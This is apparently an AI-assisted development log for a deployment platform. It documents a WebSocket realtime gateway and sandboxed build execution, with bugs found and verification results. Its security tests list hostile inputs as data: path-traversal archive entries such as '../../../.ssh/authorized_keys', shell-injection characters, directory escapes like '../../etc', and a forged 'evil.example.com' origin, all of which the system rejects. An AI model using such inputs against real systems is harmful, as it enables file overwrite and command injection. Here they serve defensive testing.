`@forge/shared` (`log | status | metric | error`), and reconnect replay using the `afterId` cursor
that `GET …/deployments/:id/events` already implements. On the dashboard it is a swap, not a rewrite:
`DeploymentsPanel` and the fleet page render exactly the shapes the socket will push, so the polling
`useQuery` calls are what gets replaced.

---

## Phase 5 — Realtime (WebSockets + Pub/Sub) ✅

**Goal:** the dashboard shows the pipeline moving *live*.
**Completed:** 2026-09-07.

### What shipped

**`packages/shared`** (`src/realtime.ts`, new)
- **The WS wire contract**, shared by the gateway and the dashboard so neither can drift.
  Client→server: `subscribe` (with an optional `afterEventId` replay cursor), `unsubscribe`, `ping`.
  Server→client: the roadmap's four data/error types — `status`, `log`, `metric`, `error` — plus the
  control frames `hello`, `subscribed`, `unsubscribed`, `pong`. `WS_PROTOCOL_VERSION` is sent in
  `hello` so a future incompatible change is detectable.
- **`parseWsTopic()`** — the one place a client-supplied topic string is validated. A topic name *is*
  the Redis channel name (`REDIS_CHANNELS`), so the parser is strict: `<kind>:<uuid>` for
  `deployment`/`project`/`org`, or the bare `metrics`. Anything else is rejected rather than
  normalised, because the string reaches Redis.
- `metricMessageSchema` — the `metric` frame the roadmap's contract calls for. Defined here; Phase 9
  supplies the publisher.
- Limits, all named in one place: `MAX_WS_CLIENT_FRAME_BYTES` (4 KiB), `MAX_TOPICS_PER_SOCKET` (32),
  `WS_SEND_BUFFER_LIMIT_BYTES` (1 MiB), `WS_REPLAY_LIMIT` (500), `WS_HEARTBEAT_MS` (30 s).
- `WS_CLOSE` — our application close codes (4401 session ended, 4403 origin refused, 4408 heartbeat
  timeout) so a client can tell "you were logged out" from "the server went away".
- `deploymentStatusMessageSchema` / `deploymentLogMessageSchema` gained **`orgId`**, which is what
  makes the `org:<id>` topic well-defined instead of a channel nothing publishes to.

**`apps/api`** (version `0.5.0`)
- `lib/pubsub.ts` — **the Redis Pub/Sub → local-sockets bridge.** One subscriber connection per API
  process (a subscriber can issue nothing but (un)subscribe, so it cannot be the command connection),
  with **refcounted** channels: the first local listener triggers `SUBSCRIBE`, the last one to leave
  triggers `UNSUBSCRIBE`, and an idle process holds none. N browsers watching one deployment cost one
  Redis subscription.
- `realtime/topic-access.ts` — **`authorizeTopic()`**. A topic carries another tenant's build logs, so
  subscribing runs the same RBAC as the REST route that returns the same data: resolve the topic to an
  org, then verify membership. A topic the caller may not see is reported *unknown*, not forbidden —
  the same reason `requireOrg` answers 404 — so ids can't be probed to enumerate other orgs.
- `realtime/replay.ts` — `loadReplay()` + `eventToFrame()`: rebuilds published frames from their
  `deployment_events` rows. `id` is monotonic, so it is both the cursor and the de-duplication key.
- `realtime/client-socket.ts` — **one browser connection**: its subscription registry, per-topic replay
  cursor, message queue, and the bounded-buffer policy. Hand-written per `CLAUDE.md §4`.
- `plugins/realtime.ts` — the gateway route (`GET /ws`), the **origin allowlist**, the shared heartbeat
  timer, credential/authorization re-validation, and the shutdown drain. `realtimeStats()` is
  decorated for Phase 9.
- `lib/redis.ts` comment updated (the subscriber connection Phase 0 said would arrive here has).
- `server.ts` — `closePubSub()` added to the shutdown sequence.
- `repositories/project-repository.ts` — `findProjectOrg()`: an *unscoped* project→org lookup used only
  to derive which org a `project:<id>` topic belongs to. Resolving the org is not authorization; the
  membership check that follows is. Every data read stays org-scoped.
- `config`: `API_INSTANCE_ID` (defaults to `<hostname>-<pid>`, mirroring `WORKER_NAME`).

**`apps/worker`**
- `deployment-state.ts` — publishes each frame to **three** channels now (`deployment:`, `project:`,
  `org:`), one per topic the dashboard can watch, and records **`status` on log events** as well as
  status events (see bugs, #1).

**`apps/dashboard`**
- `lib/realtime.ts` — `RealtimeClient`: **one socket per tab**, multiplexed over topics, with capped
  exponential backoff **plus jitter** (so N tabs don't reconnect in lockstep), a **per-topic cursor**
  resent as `afterEventId` on reconnect, and refcounted local subscriptions mirroring the server's.
  It stops retrying on 4401/4403, where retrying cannot help.
- `components/realtime-provider.tsx` — owns the tab's socket above the pages, so navigating between
  projects changes subscriptions rather than re-authenticating. `useTopic()` holds handlers in refs so
  a re-render doesn't resubscribe (which would replay the history again).
- `components/deployments-panel.tsx` — **WS-driven.** The project topic patches the history list; the
  selected deployment's topic streams its timeline (replay, then live). Frames are batched on an 80 ms
  timer, because Phase 6 streams real build output down this same path. The log box auto-scrolls but
  stops following once the reader scrolls up.
- `components/app-shell.tsx` — a **realtime status badge** (Live / Connecting / Reconnecting / Offline)
  that also names the API instance from the `hello` frame — the visible half of the fan-out demo.
- `app/orgs/[orgSlug]/fleet/page.tsx` — the org-wide activity feed is now event-driven off the `org:`
  topic; queue counters and worker heartbeats still poll (no publisher until Phase 9).

### Decisions & assumptions

- **A topic name is a Redis channel name.** The gateway's job is then a refcounted
  `SUBSCRIBE`/`UNSUBSCRIBE` per topic rather than a translation table. This is why `parseWsTopic` is
  strict rather than lenient.
- **Browsers authenticate the handshake with the session cookie; no token in the URL.** A query string
  ends up in access logs, and `CLAUDE.md §8` says secrets are never logged. The cookie works because
  the dashboard and the API differ only by port, and ports don't affect same-site. Non-browser clients
  use `Authorization` (which is how every script in the verification table connects).
- **The origin allowlist is applied by hand.** A WebSocket upgrade is *not* subject to CORS: the browser
  will upgrade from any origin and send the session cookie with it, so without this check any page the
  user visits could read their build logs (cross-site WebSocket hijacking). A missing `Origin` is
  allowed — that's a non-browser client, which carries no ambient cookies and isn't the threat.
- **Only `deployment:<id>` replays.** `project:`/`org:` carry frames from many deployments, so a single
  cursor would be meaningless there; those topics are live-only and the dashboard pairs them with a
  REST read.
- **Subscribe to Redis *before* reading the timeline.** Frames arriving during the replay are buffered
  and then de-duplicated against it by event id. The other order would leave a gap instead of an
  overlap. Since the worker writes the event *before* publishing it, this ordering makes "no gap"
  a property of the design rather than of the timing — verified in the table below.
- **Polling is the fallback, not the mechanism.** With the socket open the dashboard issues **zero**
  `/events` requests; when it drops, Phase 4's polling resumes and the UI says so. A realtime outage
  degrades rather than freezing.
- **The list is patched from frames and read back only when it must be.** A status frame carries only
  the new status, so a settled deployment (or one this tab has never seen) is re-read as a **single
  row**, not by invalidating the list — see bugs, #3.
- **Credentials and authorization are both re-validated on the heartbeat tick.** One timer for all
  sockets, not one per socket. A socket can outlive its session by days and its *membership* by
  hours, and a socket that just sits there receiving notices neither.
- **Backpressure drops and reports.** Past 1 MiB buffered, data frames are dropped and the client is
  told the count so it can re-read over REST; control frames are never dropped, because dropping a
  `subscribed` ack would break the protocol. Silently rendering an incomplete log would be worse than
  saying so.
- **`metrics` is subscribable but has no publisher yet.** The roadmap's Phase 5 contract lists `metric`,
  and the gateway is generic, so the topic works end to end — there is simply nothing publishing to it
  until Phase 9. Stated here rather than left to look finished.
- **API instance identity is per-process and reported in `hello`**, not registered in Redis. A
  Redis-backed API registry (the mirror of the worker registry) belongs with the Phase 9/10 fleet view;
  showing the serving instance in the badge already proves fan-out with two tabs.

### Bugs found and fixed during verification

1. **Replay could not reconstruct a log frame.** `deployment_events` rows for log lines stored
   `status: null`, but the published `log` frame requires the status the line was produced under — so a
   replayed log line would have had to invent one. Phase 4's `logLine()` now records `status` on log
   rows too (the column already existed, so no migration). Rows written before this fall back to the
   deployment's final status, which is noted in `eventToFrame`.
2. **A failed `SUBSCRIBE` poisoned its channel permanently.** `state.pending = state.pending.then(task)`
   — chaining onto a *rejected* promise skips the callback entirely, so after one failure (Redis down)
   every later attempt on that channel silently no-op'd and the socket could never subscribe to it
   again, even after Redis returned. Fixed with `.catch(() => undefined).then(task)`. **Confirmed by
   reverting the fix**: the regression test goes 1/3 → 3/3.
3. **The dashboard refetched the deployment list on almost every frame.** Invalidating the list query
   from the project-topic handler produced 5 list fetches during a 5 s deployment — event-driven in
   name but indistinguishable from the polling this phase replaced. Replaced with a targeted
   single-row read guarded against in-flight duplicates: **5 → 1** fetch for the same deployment.
4. **An `UNSUBSCRIBE` that failed mid-outage leaked a phantom subscription.** The channel kept
   `subscribed: true` with zero listeners, and ioredis's automatic re-subscribe re-established it on
   every future reconnect — forever. The `ready` handler now reconciles *every* channel in both
   directions rather than only ones missing a subscription.
5. **A removed org member kept receiving events on subscriptions they already held.** Membership was
   checked at subscribe time only, so being removed from an org blocked the *next* subscribe while the
   build logs already flowing kept flowing. `revalidateSubscriptions()` re-runs `authorizeTopic` on the
   heartbeat tick and drops what no longer passes. Both halves are now covered by the RBAC suite.

Hardening in the same pass: the slow-consumer notice moved from "piggyback on the next successful data
frame" to a short timer that fires once the socket has drained. Piggybacking works only while traffic
continues — a flood that *stops* at the drop leaves no next frame to ride on and the client would never
learn its log has a hole. It also now reports one complete count instead of several partial ones
(18 541 in one notice, versus 2 890 in the first of several).

**A test-only failure worth recording, since it cost time:** running `pnpm build` while `next dev` was
running overwrites `.next` and leaves the dev server serving 404 chunks — every page renders empty. It
looked like an application bug for a while and was neither. Don't run the two together.

### Verification (all run on 2026-09-07)

Every suite below is a scratchpad script driving the real stack (Postgres + Redis + API + worker +
dashboard). Counts are the scripts' own assertions.

| Check | Result |
|---|---|
| `pnpm typecheck` | ✅ clean across all 8 workspaces |
| `pnpm lint` | ✅ clean |
| `pnpm build` | ✅ 5 packages + api + worker (tsc) + dashboard (`next build`, 9 routes) |
| **Gateway smoke** — subscribe, deploy, watch | ✅ 9 `status` + 7 `log` frames on `deployment:<id>`, `queued → assigned → … → live`, ids monotonic, 0 errors |
| **Delivered == stored, exactly** — frames vs `deployment_events`, both topics, subscribe delayed 0–2000 ms | ✅ **10/10 rounds**, 16 stored = 16 on `deployment:<id>` = 16 on `project:<id>`; no gap, no duplicate, ordered. Three rounds subscribe with **zero** delay (the tightest race) |
| **Reconnect replay** — `afterEventId` at a mid-timeline cursor | ✅ replays exactly the tail past it (7 of 16); a fully caught-up cursor replays nothing; re-subscribing acks without replaying again |
| **Negative paths** | ✅ **21/21** |
| … handshake with no credential | ✅ `401` |
| … handshake from `http://evil.example.com` | ✅ `403`; from `http://localhost:3000` ✅ accepted |
| … another org's `project:` / a nonexistent deployment / `deployment:not-a-uuid` / `admin:*` | ✅ all `UNKNOWN_TOPIC` |
| … non-JSON and unknown message types | ✅ `BAD_MESSAGE`, socket stays open |
| … oversized client frame (20 KB) | ✅ closed `1009` |
| … `unsubscribe` then a new deployment | ✅ acked, **0 frames leaked** |
| **Topic cap** | ✅ **3/3** — exactly 32 of 33 *real, authorized* topics accepted, 33rd `TOO_MANY_TOPICS`, unsubscribing frees a slot |
| **RBAC on sockets** | ✅ **9/9** |
| … a `viewer` may subscribe to project/org/deployment topics in their org and receives the whole pipeline | ✅ |
| … the same `viewer` still cannot trigger a deployment | ✅ `403` |
| … subscriptions held **before** being removed from the org | ✅ revoked on the next heartbeat tick, **0 frames leaked** afterwards |
| **Session revocation** | ✅ **3/3** — logout closed the open socket with `4401 "session ended"` after 17 s |
| **Redis outage** | ✅ **7/7** |
| … a subscription established before `docker compose restart redis` | ✅ still delivers afterwards; the socket itself survives |
| … subscribing *during* the outage | ✅ `SUBSCRIBE_FAILED` (clean, not a hang); socket stays open; works again once Redis returns |
| … **the same channel** after a failed subscribe (bug #2 regression) | ✅ **3/3** with the fix, **1/3** with it reverted |
| **Two API replicas** (`:4000` + `:4001`) | ✅ **13/13** |
| … deploy through `:4000` only | ✅ the socket on `:4001` saw the **identical** status sequence, via Redis alone |
| … each socket reports its own instance in `hello` | ✅ `soosh-361371` vs `api-replica-2` |
| **Backpressure** — client stops reading (`_socket.pause()`), 20 000 × ~3.6 KB frames published | ✅ **18 541 dropped**, reported to the client once drained, socket survived |
| **Graceful shutdown** — SIGTERM with sockets open | ✅ closed `1001 "server shutting down"`, then `shutdown complete`; the peer replica kept serving and still delivered events |
| **Browser E2E (headless Chrome via CDP)** | ✅ **23/23**, 0 unexpected console errors |
| … badge reaches `open` on its own and names the instance | ✅ |
| … all 6 pipeline stages + `$ npm install` / `$ npm run build` render live | ✅ |
| … **zero `/events` REST polls** while the socket is open | ✅ 0 |
| … deployment list fetches during a ~5 s deployment | ✅ **1** (was 5 before bug #3) |
| … **API restarted mid-deployment** | ✅ badge → `reconnecting`, "falling back to polling" shown, socket reconnects unaided |
| … the timeline after that reconnect | ✅ **16 rendered = 16 stored** — the events published while the API was down were recovered from Postgres, with no duplicates |
| … **two tabs, one deployment** (the phase demo) | ✅ the second tab, which clicked nothing, watched all 6 stages advance to live over its own socket, with 0 event polls |

### Not done / deferred on purpose

- **Still no Vitest suites.** Five phases of accumulated test debt. Verification is scratchpad scripts
  (now nine of them, ~90 assertions) plus the CDP browser suite. They are throwaway scripts in
  `/tmp`, not a committed regression suite — this remains the project's biggest gap.
- **Nothing publishes to `metrics`.** The topic, the `metric` frame and the gateway path all work; the
  publisher is Phase 9. `app.realtimeStats()` is decorated and currently read by nothing.
- **No API-instance registry in Redis.** Each API reports its own socket counts; there is no
  cross-replica view of the gateway the way `workers` gives one of the fleet. Phase 9/10.
- **Worker and queue events are not published**, so the fleet page's counters and worker table still
  poll every 2 s. Only its org-wide activity feed is event-driven.
- **Replay is capped at 500 events** (`WS_REPLAY_LIMIT`) with no pagination. Phase 6's real build logs
  will exceed that for a large build; the client would need to page the REST endpoint for the rest.
  Fine while a deployment is 16 events.
- **`deployment:<id>:logtail`** (the bounded Redis list in `REDIS_KEYS`) is still unused. The replay
  reads Postgres instead. It becomes worthwhile in Phase 6 when log volume makes a Redis tail cheaper
  than a table scan.
- **Authorization refresh is only as fast as the heartbeat** (30 s). A revoked member can receive up to
  one tick's worth of events. Making it immediate needs a Redis invalidation channel; the tick is the
  honest trade-off and is now stated in the code.
- **No WS rate limiting per message**, only on the handshake (60/min) plus the frame-size and
  topic-count caps. A client could `subscribe`/`unsubscribe` in a tight loop; the per-socket message
  queue serialises it, so it costs one socket's own throughput, not the process's.
- **The `metric` frame has no `deploymentId`**, so per-container stats in Phase 9 will need either a
  `scope` convention or a contract addition.

### Next up — Phase 6 (Real builds via `child_process`)

The transport is finished, and it is the part Phase 6 plugs into rather than extends: `logLine()` in the
worker already persists, clamps and publishes a line, and the dashboard already renders a live,
auto-scrolling, batched log view fed by `deployment:<id>`. Phase 6 replaces
`simulated-pipeline.ts`'s `setTimeout`s with real work — copy the source out of storage into a sandbox
dir, then `spawn(cmd, argsArray, { shell: false })` for install and build, piping stdout/stderr through
a line-splitting `Transform` into `logLine()` — plus timeouts, process kill/cleanup on failure, exit-code
capture, and path validation against the deployment's sandbox root. The two things to watch: log volume
will be orders of magnitude higher than 16 events per deployment, which is what the 80 ms frame batching
and the 1 MiB drop policy were built for and what makes `WS_REPLAY_LIMIT` and the unused
`deployment:<id>:logtail` worth revisiting; and real `stdout`/`stderr` is untrusted input, so
`clampLogLine()` stops being theoretical.

---

## Phase 6 — Real builds via `child_process` ✅

**Goal:** actually run install + build and stream real logs.
**Completed:** 2026-09-07.

### What shipped

**`packages/shared`**
- `src/commands.ts` (new) — **`parseCommand()`**: the one place a stored command string
  (`npm run build --if-present`) becomes `spawn(file, args)`. A deliberately non-shell tokeniser:
  it understands whitespace and quoting and *nothing* else — no expansion, no substitution, no
  operators — so there is no interpretation step a `;` could survive into. `commandSchema` now
  refines on it, which turns an unbalanced quote into a 400 on the settings form instead of a
  failed deployment ten minutes later.
- `src/builds.ts` (new) — the build-log protocol both ends must agree on: `BUILD_LOG_QUEUE_LINES`
  (the sink's `highWaterMark`, and therefore the batching mechanism), `BUILD_LOG_INSERT_BATCH`,
  `createRedactor()` / `secretRedactionRules()` / `SECRET_MASK`, `StepResult` and
  `describeStepResult()`.

**`packages/db`** — three things moved here, because the worker now needs them too
- `src/secret-box.ts` — moved from `apps/api/src/lib/`. The API encrypts env vars on write; the
  worker decrypts them to inject into a build. The wire format is a property of a `bytea` column,
  so it belongs with the schema rather than duplicated in two apps.
- `repositories/env-vars.ts` (`envVarRepo`) — moved from `apps/api`, plus **`resolveEnvForBuild()`**,
  which returns decrypted values *with* their `is_secret` flag so the worker can build a redactor.
- `repositories/files.ts` (`fileRepo`) — moved from `apps/api`, plus `findFileById()` and
  `listDeploymentFiles()`. The worker writes a `files` row for every build log.
- `deploymentRepo.insertDeploymentEvents()` — **batched** append. Postgres assigns identities in
  the order the rows are given, so the ids stay monotonic in line order, which the dashboard's
  replay cursor depends on.

**`packages/config`** — ten new variables, all documented in `.env.example`: `BUILD_ROOT`,
`BUILD_INSTALL_TIMEOUT_MS`, `BUILD_BUILD_TIMEOUT_MS`, `BUILD_KILL_GRACE_MS`, `BUILD_MAX_LOG_BYTES`,
`BUILD_MAX_LOG_EVENTS`, `BUILD_MAX_EXTRACT_BYTES`, `BUILD_MAX_EXTRACT_FILES`, `BUILD_KEEP_SANDBOX`,
`BUILD_PATH`. `BUILD_ROOT` is anchored to the repo root the same way `STORAGE_ROOT` is.

**`apps/worker`** — the phase, in `src/build/`
- `sandbox.ts` — **`BuildSandbox`**: one `mkdtemp` directory per deployment attempt, and the only
  place on disk the pipeline may write. `resolveInside()` joins-and-checks; `resolveExistingInside()`
  additionally `realpath()`s and re-checks, which is the only way to catch a symlink planted inside
  the sandbox. `resolveWorkdir()` applies the project's `root_dir` and descends into a single
  top-level directory when the archive has one (what `git archive` and GitHub's "download zip"
  produce) — reported as a log line, never silently. `pruneStaleSandboxes()` sweeps directories left
  by a process that died before its `finally` ran.
- `archive.ts` — extraction. Format decided by **magic bytes**, not by the filename: `PK\x03\x04` →
  zip (yauzl, `lazyEntries`, one entry at a time), gzip or `ustar` → tar (node-tar, which sniffs
  gzip itself, so `.tar`/`.tgz`/`.tar.gz` take one path). Every entry path goes through the sandbox
  before a byte is written; a byte budget and a file-count budget are enforced *while* unpacking.
- `line-splitter.ts` — the hand-written `Transform` (CLAUDE.md §4). Carries a partial line across
  chunks, emits the trailing one at `_flush` (npm ends without a newline), decodes UTF-8 across the
  chunk boundary via `setEncoding`, treats a bare `\r` as a terminator (progress bars), and cuts a
  line that passes `MAX_LOG_LINE_LENGTH` rather than buffering a 200 MB "line".
- `log-sink.ts` — **`LogSink`**, a `Writable` rather than a method, so
  `child.stdout → LineSplitter → sink` is one `pipeline()` and backpressure reaches the child
  process. Batching falls out of the same mechanism: while lines are queued Node delivers them
  through `_writev`, which becomes one multi-row insert. Dual-writes to the **stored log object**
  (the complete record, staged in the object store and committed at the end — including for a
  failed build) and to **`deployment_events` + Redis** (the replayable tail, bounded).
- `spawn-step.ts` — `spawn(file, args, { shell: false, detached: true, stdio: ['ignore','pipe','pipe'] })`,
  both streams drained concurrently, resolve on **`close`** not `exit`, a deadline that SIGTERMs
  the **process group** and SIGKILLs it after a grace period, ENOENT reported as "Command not found".
- `build-env.ts` — the child's environment is **built, not inherited**. `process.env` in the worker
  holds `DATABASE_URL`, `REDIS_URL` and `ENCRYPTION_KEY`; a build gets an explicit allowlist
  (`PATH`, `HOME`, `TMPDIR`, `LANG`, `CI`, `NO_COLOR`, `PORT`, `FORGE_*`) plus the project's own
  variables, and `PATH`/`HOME`/`TMPDIR` are reserved so a project cannot repoint them out of the
  sandbox.
- `active-builds.ts` — the registry shutdown uses to abort in-flight builds.
- `pipeline/deploy-pipeline.ts` — replaces `simulated-pipeline.ts`. `cloning`/`installing`/`building`
  are real; the container stages stay simulated until Phase 7, in the same shape.
- `pipeline/stage-error.ts` — `StageError` moved out of the deleted simulated pipeline, now with a
  `retryable` flag Phase 8 will read.
- `lib/object-store.ts` — the worker's handle on the same `STORAGE_ROOT` the API uploads into.
- `main.ts` — prunes stale sandboxes at boot; aborts in-flight builds on shutdown.
- `services/deployment-state.ts` — `logLines()` (batched) alongside `logLine()`.

**`apps/api`** (version `0.6.0`)
- `GET /orgs/:orgId/projects/:projectId/deployments/:deploymentId/files` — objects one deployment
  produced. The bytes still come back through the existing `/files/:fileId/download` route, so there
  is one streaming download path in the API rather than two.
- Its local `file-repository.ts` / `env-var-repository.ts` / `lib/secret-box.ts` are gone; the
  services import `fileRepo` / `envVarRepo` / `encryptSecret` from `@forge/db`.

**`apps/dashboard`**
- `components/deployments-panel.tsx` — the log view is now a build log: per-stream tags (`out`,
  `err`, `···`) with `err` in amber so a failure is findable without reading every line, stage
  transitions in emerald, a line counter, a **Follow** toggle that turns itself off when the reader
  scrolls up, a **Download the full log** link once the deployment settles, and a
  `MAX_RENDERED_LINES` cap so a 5 000-line build does not put 5 000 nodes in the DOM.

**`examples/hello-forge`** (new) — the zero-dependency sample app the demo deploys. `npm install`
therefore needs no network; `npm run build` prints ~50 lines plus one on stderr and stamps the
injected `FORGE_*` variables into `dist/build-info.json`, so a demo can *show* that the environment
reached the build.

### Decisions & assumptions

- **An archive that tries to escape is refused whole; a link is skipped.** Two different rules for
  two different situations. A tarball of a real project legitimately contains symlinks, so failing
  the upload over one would break honest archives — they are skipped and named in the build log
  instead. But an archive containing `../../../.ssh/authorized_keys` is not a project with one bad
  file in it, and extracting "the rest of it" would be a strange thing to do, so the whole thing is
  refused with `ARCHIVE_UNSAFE_ENTRY`. This changed mid-phase; see bugs, #1.
- **Format comes from magic bytes.** The extension is caller-supplied metadata; the first four bytes
  are the file. gzip is routed to the tar reader because node-tar sniffs and inflates it itself.
- **Two independent traversal guards, deliberately.** yauzl validates entry names itself and
  node-tar has `preservePaths: false`; our own check against the sandbox root runs as well. Their
  messages are re-labelled to our code so the outcome reads the same however it was caught.
- **The build environment is built from nothing.** Inheriting `process.env` would hand code we are
  about to execute the database URL and the key every project's secrets are encrypted with. This is
  the single most important line in the phase.
- **`_writev` is the batching mechanism, not a timer.** A timer has to guess how long to wait; the
  writable queue depth *is* the answer, and it doubles as the backpressure signal. A quiet build
  writes one row at a time, a noisy one batches, and neither needed tuning.
- **Two caps, two purposes.** `BUILD_MAX_LOG_EVENTS` bounds the *replayable* timeline (a row and a
  socket frame per line is expensive); `BUILD_MAX_LOG_BYTES` bounds the *stored* log (a runaway build
  must not fill the disk). Past either, one notice says so — a silently short log is worse than a
  log that admits where it stops. The stored log is always the longer of the two.
- **Secrets and host paths are both masked before persistence.** Secret values because
  `deployment_events` is plaintext and the whole point of encrypting them at rest was that they never
  sit in plaintext anywhere; the sandbox and storage roots because build tools print absolute paths
  (npm names its debug log on every failure) and our filesystem layout is not the project's business.
  See bugs, #2.
- **The build log is committed for a failed build too.** It is the most useful log there is. `close()`
  never throws — losing a log must not turn a successful deployment into a failed one.
- **A single top-level directory in the archive is descended into**, and the descent is logged.
  `root_dir` remains the explicit control; this is the "the archive has a wrapper folder" case that
  every upload from `git archive` or GitHub hits, and silently building the wrong directory is a
  worse failure than a stated assumption.
- **Shutdown aborts builds rather than waiting for them.** `SHUTDOWN_TIMEOUT_MS` is ten seconds and a
  build is minutes, so waiting is not an option, and exiting without killing leaves orphaned `npm`
  trees holding a sandbox we are about to delete. The deployment is recorded `failed` with
  `BUILD_ABORTED` and a message that says why; Phase 8's retry and Phase 10's other replicas pick it
  up. A visible failure with a stated cause beats a process tree that outlives its parent.
- **`fail_at` was kept, not retired.** `DATA_MODEL`/`shared` said Phase 6 would make it a no-op. It
  now fires against the real pipeline instead, because a healthy sample app cannot fail a health
  check on demand and Phase 11's failure demos need it to. Both comments were corrected.
- **The npm cache lives outside the sandbox and is shared** (`<BUILD_ROOT>/.npm-cache`), while `HOME`
  is inside it. An isolated `HOME` alone would re-download every dependency on every deployment. It
  is a speed/isolation trade-off that stops mattering in Phase 7, when the build moves into a
  container. `pruneStaleSandboxes` skips dot-directories so the cache survives the sweep.
- **Git sources still fail with `GIT_SOURCE_UNSUPPORTED`.** Git intake was deferred in Phase 2 and
  saying so plainly beats a confusing archive error.
- **The sandbox is *not* isolation yet.** A build runs as the worker's own user with full filesystem
  access; what Phase 6 provides is that *our* paths cannot be escaped through an archive, a `root_dir`
  or a command. Real isolation — memory, CPU, pids, non-root, no host network — is Phase 7's
  container. This is the honest limit of the phase and worth saying out loud.

### Bugs found and fixed during verification

1. **An unsafe archive failed with an opaque `PIPELINE_ERROR`.** The design was "skip the bad entry,
   report it, build the rest". Nothing escaped — but yauzl rejects a traversal entry on the *zipfile*
   rather than per entry, and node-tar under `strict: true` turned its absolute-path warning into an
   error, so both readers aborted anyway and the user saw `invalid relative path: ../../../../tmp/x`.
   Rather than defeat two libraries' own guards, the rule changed to match them: a containment failure
   is now fatal by design, with `ARCHIVE_UNSAFE_ENTRY` and the offending entry named. `strict` was
   turned *off* and tar's warnings are classified by hand, so a benign warning no longer fails a
   build while a path-shaped one still does.
2. **Absolute host paths leaked into API responses and build logs.** A `rootDir` that does not exist
   in the archive surfaced `realpath`'s own ENOENT — which carries the full sandbox path — into
   `deployments.error_message`, and therefore into the dashboard. Separately, `npm` prints the
   absolute path of its debug log on every failure, so any failed install put the host layout into
   the stored log. Fixed in two places: `resolveWorkdir` now throws `ROOT_DIR_NOT_FOUND` naming only
   the `rootDir`, and `normalizeError` scrubs `BUILD_ROOT`/`STORAGE_ROOT` out of any unexpected
   error message. The log sink masks the same two roots on every line, which is why the browser suite
   asserts no `/home/...` string appears in the page.
3. **Nothing paced the log writer once the event cap was reached — and the first fix deadlocked.**
   Normally the database and Redis are the slow step and they throttle the producer for us. But past
   `BUILD_MAX_LOG_EVENTS`, `#persist` returns immediately, and the `WriteStream`'s return value was
   being ignored — so a build writing megabytes a second would have grown the stream's buffer in the
   worker's heap without bound.

   The obvious fix — latch a `#needsDrain` flag when `write()` returns `false`, then `await once(file,
   'drain')` after the batch — **hung deployments**. The stream can drain *while* we are awaiting
   Postgres, so by the time the flag is read the `'drain'` has already been emitted and the `await`
   waits for a second one that never comes. That stalls the sink, which stalls the child's stdout,
   which stalls the pipeline: a deployment sat in `building` forever with its sandbox on disk. It was
   timing-dependent — three consecutive suite runs passed before one hung — which is exactly why it
   is recorded here.

   The correct condition is read from the stream, not latched: `writableNeedDrain` is true *iff* a
   `'drain'` is still pending. Verified with a 200 000-line / 24 MB flood against a worker capped at
   50 events: RSS grew **17 MiB**, not 24 — and then four consecutive runs of the failure suite with
   no hang and no leaked sandbox.
4. **A step started after shutdown began would run to completion.** An `AbortSignal` that is
   *already* aborted never fires its `abort` event, so `addEventListener` was a no-op and the build
   step would spawn fresh work while the process was trying to leave. `runStep` now checks
   `signal.aborted` before spawning.
5. **`escalate()` leaked a pending SIGKILL timer** when both the timeout and an abort fired: the
   second call replaced `killTimer`, so the `finally` cleared only the last one. Made idempotent.

**A verification-harness bug worth recording, since it cost two wrong conclusions:** the shutdown
suite reported `BUILD_TIMEOUT` where it expected `BUILD_ABORTED`, twice. Both times the cause was the
harness, not the product. First a worker with a 5-second build timeout raced the signal; then the
launcher recorded `$!` after wrapping the command in `setsid`, which is the *wrapper's* pid — so
`stop` killed something already dead, the real worker kept consuming the queue, and two workers with
different configs were competing for jobs. Record the pid of the process you actually mean to signal.

### Verification (all run on 2026-09-07)

Scratchpad scripts driving the real stack (Postgres + Redis + API + worker + dashboard). Counts are
the scripts' own assertions.

| Check | Result |
|---|---|
| `pnpm typecheck` | ✅ clean across all 8 workspaces |
| `pnpm lint` | ✅ clean |
| `pnpm build` | ✅ 5 packages + api + worker (tsc) + dashboard (`next build`, 9 routes) |
| **Happy path, `.tar.gz`** — upload → deploy → watch | ✅ **21/21** |
| **Happy path, `.zip`** — the same suite against the other reader | ✅ **21/21** |
| … all nine pipeline stages recorded, event ids strictly increasing | ✅ |
| … real `stdout`, `stderr` *and* `system` lines all streamed | ✅ 71 log events for the sample build |
| … non-secret env var visible in the output; secret value absent everywhere | ✅ |
| … stored log downloads byte-for-byte and hashes to its recorded checksum | ✅ 4 356 bytes, 71 lines |
| … the sandbox is gone afterwards | ✅ |
| **Security paths** | ✅ **44/44** |
| … zip and tar entries named `../../../../tmp/x` | ✅ nothing written outside the sandbox; `ARCHIVE_UNSAFE_ENTRY` |
| … zip and tar entries with absolute paths (`/tmp/x`) | ✅ same |
| … all four refusals name no host path in the error | ✅ |
| … a zip carrying a symlink, a tar carrying a symlink + a fifo | ✅ skipped and reported; the build still goes live |
| … 601-file archive, and 8 MiB expanded from an 8 469-byte zip | ✅ both counted against the budgets, both build |
| … a `.zip` that is not a zip / an archive with no files | ✅ `ARCHIVE_UNRECOGNIZED` / `ARCHIVE_NO_FILES` |
| … 8 command-injection attempts (`;`, `&&`, <code>&#124;</code>, backticks, `$()`, `>`, newline, unbalanced quote) | ✅ all `400` at project-write time |
| … 4 `rootDir` escapes (`../../etc`, `/etc`, `app/../../../etc`, `C:\Windows`) | ✅ all `400` |
| … a `rootDir` absent from the archive | ✅ `ROOT_DIR_NOT_FOUND`, no host path in the message |
| **Failure paths** | ✅ **31/31** (4 consecutive runs) |
| … a build that exits 17 | ✅ `BUILD_FAILED`, exit code reported, pre-failure output kept |
| … `npm ci` with no lockfile | ✅ `INSTALL_FAILED`; stopped at `installing`, never entered `building` |
| … a program that is not on `PATH` | ✅ "Command not found: …" |
| … a build that prints its entire environment | ✅ secret masked, non-secret readable, key name still visible |
| … the same output checked for the worker's own env | ✅ no `DATABASE_URL` / `REDIS_URL` / `ENCRYPTION_KEY` |
| … sandbox paths in that output | ✅ rendered as `<sandbox>` |
| **5 000-line build** | ✅ 5 002 events in ~3.9 s; ids monotonic across batched inserts; stdout in the order written |
| … the stored log for the same build | ✅ 5 022 lines / 515 368 bytes — longer than the capped timeline, first and last line both present |
| **One 200 KB line with no newline** | ✅ split into 70 events, longest 4 096 chars |
| **Both log caps** (worker at 50 events / 4 MiB, build writes 200 000 lines ≈ 24 MB) | ✅ **9/9** |
| … timeline | ✅ 51 events, ending in "streamed log truncated after 50 lines" |
| … stored log | ✅ 4 194 362 bytes, ends in "[log truncated: reached the 4194304-byte limit after 29013 lines]", checksum still matches |
| … worker RSS | ✅ **+17 MiB** peak against a 24 MB flood (bug #3's regression check) |
| **Timeouts & kills** (worker at 5 s deadlines, 1.5 s grace) | ✅ **15/15** |
